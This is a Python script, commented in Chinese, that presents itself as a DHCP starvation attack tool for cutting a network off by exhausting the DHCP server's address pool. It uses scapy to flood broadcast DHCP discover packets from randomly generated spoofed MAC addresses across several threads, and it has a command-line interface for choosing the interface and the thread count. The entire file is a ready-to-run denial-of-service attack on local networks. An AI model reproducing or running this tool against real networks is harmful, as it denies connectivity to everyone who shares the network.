#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DHCP饥饿攻击工具
通过耗尽DHCP服务器IP地址池实现断网
"""

import socket
import struct
import time
import threading
from scapy.all import *
import random

class DHCPStarvation:
    def __init__(self):
        self.running = False
        self.threads = []
        self.mac_pool = set()
        
    def generate_random_mac(self):
        """生成随机MAC地址"""
        while True:
            mac = "02:00:00:%02x:%02x:%02x" % (
                random.randint(0, 255),
                random.randint(0, 255), 
                random.randint(0, 255)
            )
            if mac not in self.mac_pool:
                self.mac_pool.add(mac)
                return mac
    
    def dhcp_discover(self, interface):
        """发送DHCP发现包"""
        while self.running:
            try:
                # 生成随机MAC
                mac = self.generate_random_mac()
                
                # 构造DHCP发现包
                dhcp_discover = (
                    Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) /
                    IP(src="0.0.0.0", dst="255.255.255.255") /
                    UDP(sport=68, dport=67) /
                    BOOTP(chaddr=mac2str(mac)) /
                    DHCP(options=[("message-type", "discover"), "end"])
                )
                
                # 发送包
                sendp(dhcp_discover, iface=interface, verbose=0)
                print(f"[*] 发送DHCP发现包 MAC: {mac}")
                
                time.sleep(0.5)  # 控制发送频率
                
            except Exception as e:
                print(f"[!] DHCP发现包发送失败: {e}")
                time.sleep(1)
    
    def start_attack(self, interface, thread_count=5):
        """启动攻击"""
        self.running = True
        print(f"[*] 启动DHCP饥饿攻击，使用 {thread_count} 个线程")
        
        for i in range(thread_count):
            thread = threading.Thread(target=self.dhcp_discover, args=(interface,))
            thread.daemon = True
            thread.start()
            self.threads.append(thread)
        
        print("[*] 攻击进行中... 按Ctrl+C停止")
    
    def stop_attack(self):
        """停止攻击"""
        print("[*] 停止DHCP饥饿攻击")
        self.running = False
        
        for thread in self.threads:
            thread.join(timeout=2)
        
        self.threads.clear()
        print("[+] 攻击已停止")

def mac2str(mac):
    """将MAC地址字符串转换为字节"""
    return bytes.fromhex(mac.replace(':', ''))

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description='DHCP饥饿攻击工具')
    parser.add_argument('-i', '--interface', required=True, help='网络接口')
    parser.add_argument('-t', '--threads', type=int, default=5, help='线程数量')
    
    args = parser.parse_args()
    
    tool = DHCPStarvation()
    
    try:
        tool.start_attack(args.interface, args.threads)
        
        # 等待用户中断
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        tool.stop_attack()